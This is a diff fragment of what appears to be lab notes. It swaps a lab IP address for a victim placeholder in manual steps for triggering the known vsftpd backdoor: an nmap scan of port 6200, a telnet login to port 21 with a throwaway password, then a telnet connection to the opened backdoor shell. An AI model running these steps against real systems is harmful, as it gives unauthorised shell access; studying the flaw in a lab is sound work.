@@ -95,10 +95,10 @@ exploit
 
 * Testing backdoor vsftpd manual
 ```
-nmap -sS -p 6200 192.168.211.129
+nmap -sS -p 6200 <ip_victim>
 ```
 ```
-telnet  192.168.211.129 21
+telnet  <ip_victim> 21
 ```
 tape
 ```
@@ -110,11 +110,11 @@ pass doesitmatter?
 ```
 retest port in another terminal  (ctrl+shift+T)
 ```
-nmap -sS -p 6200 192.168.211.129
+nmap -sS -p 6200 <ip_victim>
 ```
 Opening backdoor 
 ```
-telnet  192.168.211.129 6200
+telnet  <ip_victim> 6200
 ```
 command should be end by ;
 ```
